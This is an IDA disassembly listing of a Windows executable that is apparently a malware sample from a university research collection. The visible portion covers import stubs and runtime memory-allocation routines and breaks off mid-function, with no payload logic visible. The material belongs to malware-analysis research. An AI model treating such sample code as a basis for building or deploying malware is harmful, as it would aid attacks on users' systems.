;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	00E98722A88904FBABA18AED9B4E0353
; Input	CRC32 :	1AE37FAC

; File Name   :	C:\Users\farhadi\Desktop\509_Malware\00e98722a88904fbaba18aed9b4e0353
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00014DE4 (  85476.)
; Section size in file		: 00014E00 (  85504.)
; Offset to raw	data for section: 00000400
; Flags	60000020: Text Executable Readable
; Alignment	: default

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
CODE		segment	para public 'CODE' use32
		assume cs:CODE
		;org 401000h
		assume es:nothing, ss:nothing, ds:CODE,	fs:nothing, gs:nothing
off_401000	dd offset dword_401004	; DATA XREF: CODE:00405481o
dword_401004	dd 61430801h, 6E696472h, 56C61h, 0FF000000h, 90FFFFFFh
					; DATA XREF: CODE:off_401000o
off_401018	dd offset dword_40101C	; DATA XREF: CODE:00405512o
					; CODE:00406669o ...
dword_40101C	dd 7453060Ah, 676E6972h	; DATA XREF: CODE:off_401018o
off_401024	dd offset dword_401070	; DATA XREF: CODE:004054E4o
					; CODE:0040E8C0o ...
		dd 7 dup(0)
		dd offset dword_401070
		dd 4, 0
		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_401070	dd 624F5407h, 7463656Ah	; DATA XREF: CODE:off_401024o
					; CODE:00401044o
; [00000006 BYTES: COLLAPSED FUNCTION GetStdHandle. PRESS KEYPAD "+" TO	EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION RaiseException. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION UnhandledExceptionFilter.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION WriteFile. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION CharNextA. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION MessageBoxA. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION FindClose. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION FindFirstFileA. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION FreeLibrary. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION GetCommandLineA. PRESS KEYPAD "+"	TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetLocaleInfoA. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION GetModuleFileNameA. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetModuleHandleA.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION GetProcAddress. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetStartupInfoA. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION GetThreadLocale. PRESS KEYPAD "+"	TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LoadLibraryExA. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION LoadStringA. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION lstrcpynA. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION lstrlenA.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION MultiByteToWideChar. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION RegCloseKey. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION RegOpenKeyExA. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION RegQueryValueExA.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION WideCharToMultiByte. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION SysReAllocStringLen. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION SysFreeString. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION GetCurrentThreadId. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION GetVersion. PRESS	KEYPAD "+" TO EXPAND]
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_401170	proc near		; CODE XREF: sub_404E74+71p

var_1C		= byte ptr -1Ch
var_18		= word ptr -18h

		push	ebx
		add	esp, 0FFFFFFBCh
		mov	ebx, 0Ah
		push	esp		; lpStartupInfo
		call	GetStartupInfoA
		test	[esp+48h+var_1C], 1
		jz	short loc_40118B
		movzx	ebx, [esp+48h+var_18]

loc_40118B:				; CODE XREF: sub_401170+14j
		mov	eax, ebx
		add	esp, 44h
		pop	ebx
		retn
sub_401170	endp

; ---------------------------------------------------------------------------
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LocalAlloc. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LocalFree. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION VirtualAlloc. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION VirtualFree. PRESS KEYPAD	"+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION InitializeCriticalSection. PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION EnterCriticalSection. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION LeaveCriticalSection. PRESS KEYPAD "+" TO	EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION DeleteCriticalSection. PRESS KEYPAD "+" TO EXPAND]
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4011D4	proc near		; CODE XREF: sub_40122C+6p
		push	ebx
		push	esi
		mov	esi, offset dword_4175E0
		cmp	dword ptr [esi], 0
		jnz	short loc_40121A
		push	644h		; uBytes
		push	0		; uFlags
		call	LocalAlloc
		mov	ecx, eax
		test	ecx, ecx
		jnz	short loc_4011F7
		xor	eax, eax
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_4011F7:				; CODE XREF: sub_4011D4+1Cj
		mov	eax, ds:dword_4175DC
		mov	[ecx], eax
		mov	ds:dword_4175DC, ecx
		xor	edx, edx

loc_401206:				; CODE XREF: sub_4011D4+44j
		mov	eax, edx
		add	eax, eax
		lea	eax, [ecx+eax*8+4]
		mov	ebx, [esi]
		mov	[eax], ebx
		mov	[esi], eax
		inc	edx
		cmp	edx, 64h
		jnz	short loc_401206

loc_40121A:				; CODE XREF: sub_4011D4+Aj
		mov	eax, [esi]
		mov	edx, [eax]
		mov	[esi], edx
		pop	esi
		pop	ebx
		retn
sub_4011D4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401224	proc near		; CODE XREF: sub_401860+33p
					; sub_401860+3Dp ...
		mov	[eax], eax
		mov	[eax+4], eax
		retn
sub_401224	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40122C	proc near		; CODE XREF: sub_401274+5Dp
					; sub_4012E4+73p ...
		push	ebx
		push	esi
		mov	esi, edx
		mov	ebx, eax
		call	sub_4011D4
		test	eax, eax
		jnz	short loc_401240
		xor	eax, eax
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_401240:				; CODE XREF: sub_40122C+Dj
		mov	edx, [esi]
		mov	[eax+8], edx
		mov	edx, [esi+4]
		mov	[eax+0Ch], edx
		mov	edx, [ebx]
		mov	[eax], edx
		mov	[eax+4], ebx
		mov	[edx+4], eax
		mov	[ebx], eax
		mov	al, 1
		pop	esi
		pop	ebx
		retn
sub_40122C	endp


; =============== S U B	R O U T	I N E =======================================


sub_40125C	proc near		; CODE XREF: sub_401274+2Cp
					; sub_401274+48p ...
		mov	edx, [eax+4]
		mov	ecx, [eax]
		mov	[edx], ecx
		mov	[ecx+4], edx
		mov	edx, ds:dword_4175E0
		mov	[eax], edx
		mov	ds:dword_4175E0, eax
		retn
sub_40125C	endp


; =============== S U B	R O U T	I N E =======================================


sub_401274	proc near		; CODE XREF: sub_401620+6Cp
					; sub_4016B0+62p ...

var_14		= dword	ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		push	ecx
		mov	esi, ecx
		mov	[esp+14h+var_14], edx
		mov	ebp, eax
		mov	ebx, [ebp+0]
		mov	eax, [esp+14h+var_14]
		mov	edx, [eax]
		mov	[esi], edx
		mov	edx, [eax+4]
		mov	[esi+4], edx

loc_401290:				; CODE XREF: sub_401274+57j
		mov	edi, [ebx]
		mov	eax, [esi]
		mov	edx, [ebx+8]
		add	edx, [ebx+0Ch]
		cmp	eax, edx
		jnz	short loc_4012B2
		mov	eax, ebx
		call	sub_40125C
		mov	eax, [ebx+8]
		mov	[esi], eax
		mov	eax, [ebx+0Ch]
		add	[esi+4], eax
		jmp	short loc_4012C7
; ---------------------------------------------------------------------------

loc_4012B2:				; CODE XREF: sub_401274+28j
		add	eax, [esi+4]
		cmp	eax, [ebx+8]
		jnz	short loc_4012C7
		mov	eax, ebx
		call	sub_40125C
		mov	eax, [ebx+0Ch]
		add	[esi+4], eax

loc_4012C7:				; CODE XREF: sub_401274+3Cj
					; sub_401274+44j
		mov	ebx, edi
		cmp	ebp, ebx
		jnz	short loc_401290
		mov	edx, esi
		mov	eax, ebp
		call	sub_40122C
		test	al, al
		jnz	short loc_4012DE
		xor	eax, eax
		mov	[esi], eax

loc_4012DE:				; CODE XREF: sub_401274+64j
		pop	edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401274	endp


; =============== S U B	R O U T	I N E =======================================


sub_4012E4	proc near		; CODE XREF: sub_4017D4+7Ap
					; sub_401BBC+99p

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFFFF8h
		mov	ebx, eax
		mov	edi, ebx

loc_4012EF:				; CODE XREF: sub_4012E4+88j
		mov	esi, [edx]
		mov	eax, [ebx+8]
		cmp	esi, eax
		jb	short loc_401368
		mov	ecx, esi
		add	ecx, [edx+4]
		mov	ebp, eax
		add	ebp, [ebx+0Ch]
		cmp	ecx, ebp
		ja	short loc_401368
		cmp	esi, eax
		jnz	short loc_401325
		mov	eax, [edx+4]
		add	[ebx+8], eax
		mov	eax, [edx+4]
		sub	[ebx+0Ch], eax
		cmp	dword ptr [ebx+0Ch], 0
		jnz	short loc_401364
		mov	eax, ebx
		call	sub_40125C
		jmp	short loc_401364
; ---------------------------------------------------------------------------

loc_401325:				; CODE XREF: sub_4012E4+24j
		mov	ecx, esi
		mov	edi, [edx+4]
		add	ecx, edi
		mov	ebp, eax
		add	ebp, [ebx+0Ch]
		cmp	ecx, ebp
		jnz	short loc_40133A
		sub	[ebx+0Ch], edi
		jmp	short loc_401364
; ---------------------------------------------------------------------------

loc_40133A:				; CODE XREF: sub_4012E4+4Fj
		mov	ecx, [edx]
		add	ecx, [edx+4]
		mov	[esp+18h+var_18], ecx
		mov	edi, [ebx+8]
		add	edi, [ebx+0Ch]
		sub	edi, ecx
		mov	[esp+18h+var_14], edi
		sub	esi, eax
		mov	[ebx+0Ch], esi
		mov	edx, esp
		mov	eax, ebx
		call	sub_40122C
		test	al, al
		jnz	short loc_401364
		xor	eax, eax
		jmp	short loc_401370
; ---------------------------------------------------------------------------

loc_401364:				; CODE XREF: sub_4012E4+36j
					; sub_4012E4+3Fj ...
		mov	al, 1
		jmp	short loc_401370
; ---------------------------------------------------------------------------

loc_401368:				; CODE XREF: sub_4012E4+12j
					; sub_4012E4+20j
		mov	ebx, [ebx]
		cmp	edi, ebx
		jnz	short loc_4012EF
		xor	eax, eax

loc_401370:				; CODE XREF: sub_4012E4+7Ej
					; sub_4012E4+82j
		pop	ecx
		pop	edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4012E4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401378	proc near		; CODE XREF: sub_401620+5Cp
		push	ebx
		push	esi
		push	edi
		mov	ebx, edx
		mov	esi, eax
		cmp	esi, 100000h
		jge	short loc_40138E
		mov	esi, 100000h
		jmp	short loc_40139A
; ---------------------------------------------------------------------------

loc_40138E:				; CODE XREF: sub_401378+Dj
		add	esi, 0FFFFh
		and	esi, 0FFFF0000h

loc_40139A:				; CODE XREF: sub_401378+14j
		mov	[ebx+4], esi
		push	1		; flProtect
		push	2000h		; flAllocationType
		push	esi		; dwSize
		push	0		; lpAddress
		call	VirtualAlloc
		mov	edi, eax
		mov	[ebx], edi
		test	edi, edi
		jz	short loc_4013D7
		mov	edx, ebx
		mov	eax, offset dword_4175E4
		call	sub_40122C
		test	al, al
		jnz	short loc_4013D7
		push	8000h		; dwFreeType
		push	0		; dwSize
		mov	eax, [ebx]
		push	eax		; lpAddress
		call	VirtualFree
		xor	eax, eax
		mov	[ebx], eax

loc_4013D7:				; CODE XREF: sub_401378+3Aj
					; sub_401378+4Aj
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401378	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4013DC	proc near		; CODE XREF: sub_4016B0+4Cp
					; sub_4016B0+93p
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	ebx, ecx
		mov	esi, edx
		mov	ebp, eax
		mov	dword ptr [ebx+4], 100000h
		push	4		; flProtect
		push	2000h		; flAllocationType
		push	100000h		; dwSize
		push	ebp		; lpAddress
		call	VirtualAlloc
		mov	edi, eax
		mov	[ebx], edi
		test	edi, edi
		jnz	short loc_401426
		add	esi, 0FFFFh
		and	esi, 0FFFF0000h
		mov	[ebx+4], esi
		push	4		; flProtect
		push	2000h		; flAllocationType
		push	esi		; dwSize
		push	ebp		; lpAddress
		call	VirtualAlloc
		mov	[ebx], eax

loc_401426:				; CODE XREF: sub_4013DC+29j
		cmp	dword ptr [ebx], 0
		jz	short loc_40144E
		mov	edx, ebx
		mov	eax, offset dword_4175E4
		call	sub_40122C
		test	al, al
		jnz	short loc_40144E
		push	8000h		; dwFreeType
		push	0		; dwSize
		mov	eax, [ebx]
		push	eax		; lpAddress
		call	VirtualFree
		xor	eax, eax
		mov	[ebx], eax

loc_40144E:				; CODE XREF: sub_4013DC+4Dj
					; sub_4013DC+5Dj
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4013DC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401454	proc near		; CODE XREF: sub_401620+7Ep
					; sub_4016B0+7Ap ...

var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFFFECh
		mov	[esp+24h+var_20], ecx
		mov	[esp+24h+var_24], edx
		mov	[esp+24h+var_1C], 0FFFFFFFFh
		xor	edx, edx
		mov	[esp+24h+var_18], edx
		mov	ebp, eax
		mov	eax, [esp+24h+var_24]
		add	eax, ebp
		mov	[esp+24h+var_14], eax
		mov	ebx, ds:dword_4175E4
		jmp	short loc_4014D4
; ---------------------------------------------------------------------------

loc_401483:				; CODE XREF: sub_401454+86j
		mov	edi, [ebx]
		mov	esi, [ebx+8]
		cmp	ebp, esi
		ja	short loc_4014D2
		mov	eax, esi
		add	eax, [ebx+0Ch]
		cmp	eax, [esp+24h+var_14]
		ja	short loc_4014D2
		cmp	esi, [esp+24h+var_1C]
		jnb	short loc_4014A1
		mov	[esp+24h+var_1C], esi

loc_4014A1:				; CODE XREF: sub_401454+47j
		mov	eax, esi
		add	eax, [ebx+0Ch]
		cmp	eax, [esp+24h+var_18]
		jbe	short loc_4014B0
		mov	[esp+24h+var_18], eax

loc_4014B0:				; CODE XREF: sub_401454+56j
		push	8000h		; dwFreeType
		push	0		; dwSize
		push	esi		; lpAddress
		call	VirtualFree
		test	eax, eax
		jnz	short loc_4014CB
		mov	ds:dword_4175C0, 1

loc_4014CB:				; CODE XREF: sub_401454+6Bj
		mov	eax, ebx
		call	sub_40125C

loc_4014D2:				; CODE XREF: sub_401454+36j
					; sub_401454+41j
		mov	ebx, edi

loc_4014D4:				; CODE XREF: sub_401454+2Dj
		cmp	ebx, offset dword_4175E4
		jnz	short loc_401483
		mov	eax, [esp+24h+var_20]
		xor	edx, edx
		mov	[eax], edx
		cmp	[esp+24h+var_18], 0
		jz	short loc_401504
		mov	eax, [esp+24h+var_20]
		mov	edx, [esp+24h+var_1C]
		mov	[eax], edx
		mov	eax, [esp+24h+var_18]
		sub	eax, [esp+24h+var_1C]
		mov	edx, [esp+24h+var_20]
		mov	[edx+4], eax

loc_401504:				; CODE XREF: sub_401454+95j
		add	esp, 14h
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401454	endp


; =============== S U B	R O U T	I N E =======================================


sub_40150C	proc near		; CODE XREF: sub_401620+2Dp
					; sub_4016B0+E6p

var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFFFF4h
		mov	[esp+1Ch+var_18], ecx
		mov	[esp+1Ch+var_1C], edx
		mov	edx, eax
		mov	ebp, edx
		and	ebp, 0FFFFF000h
		add	edx, [esp+1Ch+var_1C]
		add	edx, 0FFFh
		and	edx, 0FFFFF000h
		mov	[esp+1Ch+var_14], edx
		mov	eax, [esp+1Ch+var_18]
		mov	[eax], ebp
		mov	eax, [esp+1Ch+var_14]
		sub	eax, ebp
		mov	edx, [esp+1Ch+var_18]
		mov	[edx+4], eax
		mov	esi, ds:dword_4175E4
		jmp	short loc_40158E
; ---------------------------------------------------------------------------

loc_401552:				; CODE XREF: sub_40150C+88j
		mov	ebx, [esi+8]
		mov	edi, [esi+0Ch]
		add	edi, ebx
		cmp	ebp, ebx
		jbe	short loc_401560
		mov	ebx, ebp

loc_401560:				; CODE XREF: sub_40150C+50j
		cmp	edi, [esp+1Ch+var_14]
		jbe	short loc_40156A
		mov	edi, [esp+1Ch+var_14]

loc_40156A:				; CODE XREF: sub_40150C+58j
		cmp	edi, ebx
		jbe	short loc_40158C
		push	4		; flProtect
		push	1000h		; flAllocationType
		sub	edi, ebx
		push	edi		; dwSize
		push	ebx		; lpAddress
		call	VirtualAlloc
		test	eax, eax
		jnz	short loc_40158C
		mov	eax, [esp+1Ch+var_18]
		xor	edx, edx
		mov	[eax], edx
		jmp	short loc_401596
; ---------------------------------------------------------------------------

loc_40158C:				; CODE XREF: sub_40150C+60j
					; sub_40150C+74j
		mov	esi, [esi]

loc_40158E:				; CODE XREF: sub_40150C+44j
		cmp	esi, offset dword_4175E4
		jnz	short loc_401552

loc_401596:				; CODE XREF: sub_40150C+7Ej
		add	esp, 0Ch
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40150C	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4015A0	proc near		; CODE XREF: sub_4017D4+2Ep

var_14		= dword	ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		push	ecx
		mov	ebx, eax
		mov	esi, ebx
		add	esi, 0FFFh
		and	esi, 0FFFFF000h
		mov	[esp+14h+var_14], esi
		mov	ebp, ebx
		add	ebp, edx
		and	ebp, 0FFFFF000h
		mov	eax, [esp+14h+var_14]
		mov	[ecx], eax
		mov	eax, ebp
		sub	eax, [esp+14h+var_14]
		mov	[ecx+4], eax
		mov	esi, ds:dword_4175E4
		jmp	short loc_40160F
; ---------------------------------------------------------------------------

loc_4015D7:				; CODE XREF: sub_4015A0+75j
		mov	ebx, [esi+8]
		mov	edi, [esi+0Ch]
		add	edi, ebx
		cmp	ebx, [esp+14h+var_14]
		jnb	short loc_4015E7
		mov	ebx, [esp+14h+var_14]

loc_4015E7:				; CODE XREF: sub_4015A0+42j
		cmp	ebp, edi
		jnb	short loc_4015ED
		mov	edi, ebp

loc_4015ED:				; CODE XREF: sub_4015A0+49j
		cmp	edi, ebx
		jbe	short loc_40160D
		push	4000h		; dwFreeType
		sub	edi, ebx
		push	edi		; dwSize
		push	ebx		; lpAddress
		call	VirtualFree
		test	eax, eax
		jnz	short loc_40160D
		mov	ds:dword_4175C0, 2

loc_40160D:				; CODE XREF: sub_4015A0+4Fj
					; sub_4015A0+61j
		mov	esi, [esi]

loc_40160F:				; CODE XREF: sub_4015A0+35j
		cmp	esi, offset dword_4175E4
		jnz	short loc_4015D7
		pop	edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4015A0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_401620	proc near		; CODE XREF: sub_401DCC+Bp

var_18		= dword	ptr -18h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFFFF8h
		mov	esi, edx
		mov	edi, eax
		mov	ebp, offset dword_4175F4
		add	edi, 3FFFh
		and	edi, 0FFFFC000h

loc_40163C:				; CODE XREF: sub_401620+75j
		mov	ebx, [ebp+0]
		jmp	short loc_401674
; ---------------------------------------------------------------------------

loc_401641:				; CODE XREF: sub_401620+56j
		cmp	edi, [ebx+0Ch]
		jg	short loc_401672
		mov	ecx, esi
		mov	edx, edi
		mov	eax, [ebx+8]
		call	sub_40150C
		cmp	dword ptr [esi], 0
		jz	short loc_4016A7
		mov	eax, [esi+4]
		add	[ebx+8], eax
		mov	eax, [esi+4]
		sub	[ebx+0Ch], eax
		cmp	dword ptr [ebx+0Ch], 0
		jnz	short loc_4016A7
		mov	eax, ebx
		call	sub_40125C
		jmp	short loc_4016A7
; ---------------------------------------------------------------------------

loc_401672:				; CODE XREF: sub_401620+24j
		mov	ebx, [ebx]

loc_401674:				; CODE XREF: sub_401620+1Fj
		cmp	ebx, ebp
		jnz	short loc_401641
		mov	edx, esi
		mov	eax, edi
		call	sub_401378
		cmp	dword ptr [esi], 0
		jz	short loc_4016A7
		mov	ecx, esp
		mov	edx, esi
		mov	eax, ebp
		call	sub_401274
		cmp	[esp+18h+var_18], 0
		jnz	short loc_40163C
		mov	ecx, esp
		mov	edx, [esi+4]
		mov	eax, [esi]
		call	sub_401454
		xor	eax, eax
		mov	[esi], eax

loc_4016A7:				; CODE XREF: sub_401620+35j
					; sub_401620+47j ...
		pop	ecx
		pop	edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401620	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4016B0	proc near		; CODE XREF: sub_401DF8+10p

var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFFFECh
		mov	[esp+24h+var_24], ecx
		mov	edi, edx
		mov	esi, eax
		mov	ebp, offset dword_4175F4
		add	edi, 3FFFh
		and	edi, 0FFFFC000h

loc_4016CF:				; CODE XREF: sub_4016B0+6Cj
					; sub_4016B0+B3j
		mov	ebx, [ebp+0]
		jmp	short loc_4016D6
; ---------------------------------------------------------------------------

loc_4016D4:				; CODE XREF: sub_4016B0+2Dj
		mov	ebx, [ebx]

loc_4016D6:				; CODE XREF: sub_4016B0+22j
		cmp	ebx, ebp
		jz	short loc_4016DF
		cmp	esi, [ebx+8]
		jnz	short loc_4016D4

loc_4016DF:				; CODE XREF: sub_4016B0+28j
		cmp	esi, [ebx+8]
		jnz	short loc_40173B
		cmp	edi, [ebx+0Ch]
		jle	loc_401783
		lea	ecx, [esp+24h+var_20]
		mov	edx, edi
		sub	edx, [ebx+0Ch]
		mov	eax, [ebx+8]
		add	eax, [ebx+0Ch]
		call	sub_4013DC
		cmp	[esp+24h+var_20], 0
		jz	short loc_40173B
		lea	ecx, [esp+24h+var_18]
		lea	edx, [esp+24h+var_20]
		mov	eax, ebp
		call	sub_401274
		cmp	[esp+24h+var_18], 0
		jnz	short loc_4016CF
		lea	ecx, [esp+24h+var_18]
		mov	edx, [esp+24h+var_1C]
		mov	eax, [esp+24h+var_20]
		call	sub_401454
		mov	eax, [esp+24h+var_24]
		xor	edx, edx
		mov	[eax], edx
		jmp	loc_4017CB
; ---------------------------------------------------------------------------

loc_40173B:				; CODE XREF: sub_4016B0+32j
					; sub_4016B0+56j
		lea	ecx, [esp+24h+var_20]
		mov	edx, edi
		mov	eax, esi
		call	sub_4013DC
		cmp	[esp+24h+var_20], 0
		jz	short loc_401783
		lea	ecx, [esp+24h+var_18]
		lea	edx, [esp+24h+var_20]
		mov	eax, ebp
		call	sub_401274
		cmp	[esp+24h+var_18], 0
		jnz	loc_4016CF
		lea	ecx, [esp+24h+var_18]
		mov	edx, [esp+24h+var_1C]
		mov	eax, [esp+24h+var_20]
		call	sub_401454
		mov	eax, [esp+24h+var_24]
		xor	edx, edx
		mov	[eax], edx
		jmp	short loc_4017CB
; ---------------------------------------------------------------------------

loc_401783:				; CODE XREF: sub_4016B0+37j
					; sub_4016B0+9Dj
		mov	ebp, [ebx+8]
		cmp	esi, ebp
		jnz	short loc_4017C4
		cmp	edi, [ebx+0Ch]
		jg	short loc_4017C4
		mov	ecx, [esp+24h+var_24]
		mov	edx, edi
		mov	eax, ebp
		call	sub_40150C
		mov	eax, [esp+24h+var_24]
		cmp	dword ptr [eax], 0
		jz	short loc_4017CB
		mov	eax, [esp+24h+var_24]
		mov	eax, [eax+4]
		add	[ebx+8], eax
		mov	eax, [esp+24h+var_24]
		mov	eax, [eax+4]
		sub	[ebx+0Ch], eax
		cmp	dword ptr [ebx+0Ch], 0
		jnz	short loc_4017CB
		mov	eax, ebx
		call	sub_40125C
		jmp	short loc_4017CB
; ---------------------------------------------------------------------------

loc_4017C4:				; CODE XREF: sub_4016B0+D8j
					; sub_4016B0+DDj
		mov	eax, [esp+24h+var_24]
		xor	edx, edx
		mov	[eax], edx

loc_4017CB:				; CODE XREF: sub_4016B0+86j
					; sub_4016B0+D1j ...
		add	esp, 14h
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4016B0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4017D4	proc near		; CODE XREF: sub_401BBC+4Ep
					; sub_401BBC+61p

var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h

		push	ebx
		push	esi
		push	edi
		add	esp, 0FFFFFFECh
		mov	edi, ecx
		mov	[esp+20h+var_20], edx
		lea	ebx, [eax+3FFFh]
		and	ebx, 0FFFFC000h
		mov	esi, [esp+20h+var_20]
		add	esi, eax
		and	esi, 0FFFFC000h
		cmp	ebx, esi
		jnb	short loc_401855
		mov	ecx, edi
		mov	edx, esi
		sub	edx, ebx
		mov	eax, ebx
		call	sub_4015A0
		lea	ecx, [esp+20h+var_1C]
		mov	edx, edi
		mov	eax, offset dword_4175F4
		call	sub_401274
		mov	ebx, [esp+20h+var_1C]
		test	ebx, ebx
		jz	short loc_40183E
		lea	ecx, [esp+20h+var_14]
		mov	edx, [esp+20h+var_18]
		mov	eax, ebx
		call	sub_401454
		mov	eax, [esp+20h+var_14]
		mov	[esp+20h+var_1C], eax
		mov	eax, [esp+20h+var_10]
		mov	[esp+20h+var_18], eax

loc_40183E:				; CODE XREF: sub_4017D4+49j
		cmp	[esp+20h+var_1C], 0
		jz	short loc_401859
		lea	edx, [esp+20h+var_1C]
		mov	eax, offset dword_4175F4
		call	sub_4012E4
		jmp	short loc_401859
; ---------------------------------------------------------------------------

loc_401855:				; CODE XREF: sub_4017D4+24j
		xor	eax, eax
		mov	[edi], eax

loc_401859:				; CODE XREF: sub_4017D4+6Fj
